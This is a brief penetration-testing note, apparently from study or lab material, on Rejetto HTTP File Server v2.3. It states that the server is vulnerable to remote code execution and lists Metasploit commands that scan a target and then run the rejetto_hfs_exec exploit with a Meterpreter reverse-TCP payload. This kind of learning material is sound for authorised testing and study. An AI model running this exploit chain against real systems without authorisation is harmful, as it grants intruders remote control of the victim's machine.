# Rejetto HTTP File Server

HTTP File Server is a web server that is used for file and document sharing. It allows users to upload, download, and manage files via a web interface.

It typically runs on TCP por 80 and uses the HTTP protocol for underlying communication.

Rejetto HFS is a popular free and open source HTTP file server that can be set up on Windows and Linux.

> Rejetto HFS v2.3 is vulnerable to RCE.


```bash
service postgresql start

msfconsole -q

db_status

workspace -a HFS

setg RHOSTS TARGET_IP

db_nmap -sS -sV -O TARGET_IP

search:exploit name:rejetto

use exploit/windows/http/rejetto_hfs_exec

set payload windows/x64/meterpreter/reverse_tcp

run
```